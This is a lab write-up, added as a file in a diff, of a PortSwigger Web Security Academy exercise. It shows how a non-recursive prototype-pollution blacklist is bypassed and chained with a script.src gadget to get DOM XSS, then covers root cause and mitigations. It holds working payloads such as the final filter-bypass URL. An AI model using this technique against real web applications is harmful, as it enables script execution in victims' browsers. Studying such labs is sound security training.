@@ -1,0 +1,420 @@
+PortSwigger Web Security Academy
+DOM XSS via an alternative prototype pollution vector
+Information
+Category: Client-side Prototype Pollution
+Difficulty: Practitioner
+Status: ✅ Solved
+Author: Alejandro Jiménez
+Objective
+
+Exploit a client-side prototype pollution vulnerability to achieve DOM-based Cross-Site Scripting (DOM XSS).
+
+In this lab, the application attempts to protect itself against prototype pollution by filtering dangerous property names such as:
+
+__proto__
+constructor
+prototype
+
+However, the sanitization mechanism is not applied recursively. This allows the blacklist to be bypassed by manipulating the structure of the property name.
+
+The prototype pollution can then be combined with a JavaScript gadget that uses the inherited transport_url property as the source of a dynamically created <script> element.
+
+The complete exploitation chain is:
+
+Prototype Pollution Filter Bypass
+            ↓
+Object.prototype.transport_url
+            ↓
+config.transport_url
+            ↓
+script.src
+            ↓
+JavaScript execution
+            ↓
+DOM XSS
+Technologies involved
+JavaScript
+Client-side Prototype Pollution
+Object.prototype
+DOM XSS
+DOM manipulation
+script.src
+URL query parameters
+JavaScript property sanitization
+Browser Developer Tools
+Reconnaissance
+1. Testing the standard prototype pollution vector
+
+The first payload tested was:
+
+/?__proto__.foo=bar
+
+After loading the URL, the browser console was opened and the following command was executed:
+
+Object.prototype
+
+The injected property:
+
+foo: "bar"
+
+was not present.
+
+This indicated that the application was filtering the standard __proto__ prototype pollution vector.
+
+2. Testing alternative vectors
+
+Additional prototype pollution syntaxes were tested:
+
+/?__proto__[foo]=bar
+
+and:
+
+/?constructor.prototype.foo=bar
+
+After each request, the following was checked:
+
+Object.prototype
+
+The foo property was still not present.
+
+This confirmed that the application was actively filtering the common prototype pollution vectors.
+
+Analyzing the sanitization mechanism
+
+The JavaScript source files loaded by the application were inspected through:
+
+DevTools → Sources
+
+The relevant files included:
+
+deparamSanitized.js
+searchLoggerFiltered.js
+
+The application uses a function called:
+
+sanitizeKey()
+
+to remove potentially dangerous property names.
+
+The blacklist includes properties associated with prototype pollution, such as:
+
+__proto__
+constructor
+prototype
+
+However, the important weakness is that the sanitization is not performed recursively.
+
+This means that manipulating the property name can cause the dangerous sequence to survive the sanitization process.
+
+Bypassing the blacklist
+
+The following payload was tested:
+
+/?__pro__proto__to__[foo]=bar
+
+The duplicated string:
+
+__pro__proto__to__
+
+contains the dangerous property name in a form that can bypass the filtering logic.
+
+After the sanitization process, the application effectively reconstructs the dangerous property:
+
+__proto__
+
+with the nested property:
+
+foo
+
+The result is equivalent to:
+
+__proto__[foo]=bar
+Confirming prototype pollution
+
+After loading the bypass payload, the following command was executed in the browser console:
+
+Object.prototype
+
+The object now contained:
+
+foo: "bar"
+
+This confirmed that the blacklist had been bypassed successfully.
+
+The application was therefore vulnerable to client-side prototype pollution despite attempting to filter dangerous property names.
+
+Identifying the gadget
+
+The JavaScript source files were inspected again to identify a property that could turn prototype pollution into JavaScript execution.
+
+The relevant gadget was located in:
+
+searchLogger.js
+
+The application dynamically creates a <script> element using the transport_url property:
+
+if(config.transport_url) {
+    let script = document.createElement('script');
+    script.src = config.transport_url;
+    document.body.appendChild(script);
+}
+
+The important property is:
+
+config.transport_url
+
+The config object does not explicitly define this property.
+
+Because JavaScript performs property lookup through the prototype chain, a polluted property on:
+
+Object.prototype
+
+can become accessible through:
+
+config.transport_url
+Testing the gadget
+
+The prototype pollution payload was modified to inject the transport_url property:
+
+/?__pro__proto__to__[transport_url]=foo
+
+After refreshing the page, the Elements tab was inspected.
+
+A dynamically generated element similar to the following was observed:
+
+<script src="foo"></script>
+
+This confirmed that the polluted property reached the gadget.
+
+The exploitation chain was now:
+
+__pro__proto__to__
+        ↓
+Object.prototype
+        ↓
+transport_url
+        ↓
+config.transport_url
+        ↓
+script.src
+Crafting the XSS payload
+
+The arbitrary value:
+
+foo
+
+was replaced with a data: URL containing JavaScript:
+
+data:,alert(1);
+
+The final payload was:
+
+/?__pro__proto__to__[transport_url]=data:,alert(1);
+
+The browser interpreted the value as the source of the dynamically created script element.
+
+This resulted in the execution of:
+
+alert(1)
+Final exploit
+/?__pro__proto__to__[transport_url]=data:,alert(1);
+
+The payload performs two actions simultaneously:
+
+1. Bypasses the prototype pollution filter
+__pro__proto__to__
+
+bypasses the blacklist and results in the dangerous __proto__ property being reconstructed.
+
+2. Pollutes the transport_url property
+[transport_url]=data:,alert(1);
+
+causes:
+
+Object.prototype.transport_url
+
+to contain the attacker-controlled value.
+
+The gadget subsequently accesses:
+
+config.transport_url
+
+and assigns it to:
+
+script.src
+Exploitation flow
+Attacker-controlled URL
+        ↓
+__pro__proto__to__[transport_url]
+        ↓
+Blacklist bypass
+        ↓
+Object.prototype.transport_url
+        ↓
+config.transport_url
+        ↓
+document.createElement('script')
+        ↓
+script.src = "data:,alert(1);"
+        ↓
+JavaScript execution
+        ↓
+alert(1)
+        ↓
+DOM XSS
+Evidence
+
+The successful exploitation caused the browser to execute:
+
+alert(1)
+
+The PortSwigger lab was subsequently marked:
+
+Solved
+
+This confirms that the attacker-controlled prototype property successfully reached the JavaScript execution sink.
+
+Root Cause
+
+The vulnerability is caused by the combination of two security weaknesses.
+
+1. Incomplete prototype pollution sanitization
+
+The application uses a blacklist to remove dangerous property names:
+
+__proto__
+constructor
+prototype
+
+However, the sanitization is not recursive.
+
+As a result, specially constructed property names can bypass the blacklist and ultimately reconstruct dangerous properties.
+
+2. Unsafe use of inherited properties
+
+The application trusts:
+
+config.transport_url
+
+without verifying that the property belongs directly to the config object.
+
+Because properties can be inherited from Object.prototype, a polluted prototype can influence the value.
+
+3. Dynamic script creation
+
+The application subsequently uses the attacker-controlled value as:
+
+script.src = config.transport_url;
+
+This creates a DOM XSS sink because the attacker can control the source of the dynamically generated script.
+
+Impact
+
+Successful exploitation allows an attacker to execute arbitrary JavaScript in the context of the vulnerable application.
+
+Potential consequences include:
+
+DOM XSS
+Manipulation of the application's DOM
+Execution of attacker-controlled JavaScript
+Access to information available to JavaScript
+Performing actions in the victim's browser context
+Potential account compromise depending on the application's functionality
+Mitigation
+Avoid prototype pollution
+
+User-controlled parameters should never be allowed to modify object prototypes.
+
+Dangerous properties such as:
+
+__proto__
+constructor
+prototype
+
+should be rejected safely.
+
+Avoid blacklist-only sanitization
+
+Blacklists are fragile because attackers may be able to manipulate the input structure to bypass them.
+
+Input should instead be validated against an allowlist of expected properties.
+
+For example:
+
+const allowedKeys = [
+    "search",
+    "category"
+];
+
+Only explicitly expected properties should be processed.
+
+Apply validation recursively
+
+If nested objects are accepted, validation must be performed at every level of the resulting object structure.
+
+A filter applied only to the initial property name is insufficient.
+
+Check for own properties
+
+Before using security-sensitive configuration values, the application should verify that they are actually defined on the object itself:
+
+Object.hasOwn(config, "transport_url")
+
+rather than relying on inherited properties.
+
+Avoid dynamic script sources
+
+The application should not dynamically create scripts using untrusted values:
+
+script.src = userControlledValue;
+
+If dynamic scripts are required, their sources should be strictly validated against an allowlist.
+
+Avoid dangerous dynamic execution
+
+Where possible, applications should avoid patterns that allow attacker-controlled input to become executable JavaScript.
+
+CWE Classification
+CWE-1321 – Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
+CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
+CWE-20 – Improper Input Validation
+OWASP Classification
+A03 – Injection
+A05 – Security Misconfiguration
+Conclusion
+
+This laboratory demonstrates how a seemingly protected application can remain vulnerable to client-side prototype pollution when its sanitization mechanism relies on an incomplete blacklist.
+
+The standard vectors:
+
+__proto__
+constructor
+prototype
+
+were blocked successfully.
+
+However, the alternative payload:
+
+/?__pro__proto__to__[foo]=bar
+
+was able to bypass the sanitization logic because the dangerous property name was reconstructed after the filtering process.
+
+After confirming prototype pollution, the transport_url property was identified as a gadget because it controls the src attribute of a dynamically created <script> element.
+
+The final payload:
+
+/?__pro__proto__to__[transport_url]=data:,alert(1);
+
+successfully chained the prototype pollution source with the script.src gadget and resulted in JavaScript execution.
+
+The complete attack can therefore be summarized as:
+
+Blacklist Bypass
+       +
+Prototype Pollution
+       +
+Inherited Property
+       +
+script.src Gadget
+       =
+DOM XSS
